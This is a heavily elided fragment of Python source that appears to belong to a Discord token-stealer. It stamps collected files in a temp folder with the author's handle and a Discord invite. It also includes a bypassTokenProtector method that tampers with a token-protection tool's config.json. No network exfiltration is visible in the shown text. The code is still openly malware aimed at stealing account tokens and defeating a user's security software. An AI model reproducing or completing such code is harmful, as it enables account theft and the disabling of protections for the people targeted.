                ...
                with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
                    ...
                    if x != "":
                        with open(self.tempfolder+os.sep+i, "w", encoding="cp437") as f:
                            f.write("Made by Kartierjay#0001 | https://discord.gg/zwpWPcHyjt\n\n")
                        with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                            fp.write(x)
                            fp.write("\n\nMade by Kartierjay#0001 | https://discord.gg/zwpWPcHyjt")
                    else:
                        f.close()
                        try:
    ...
    def bypassTokenProtector(self):
        ...
        try:
            ...
            with open(tp+"config.json", 'a') as f:
                f.write("\n\n//Kartier just shit on this token protector | https://discord.gg/zwpWPcHyjt")
        except Exception:
            pass
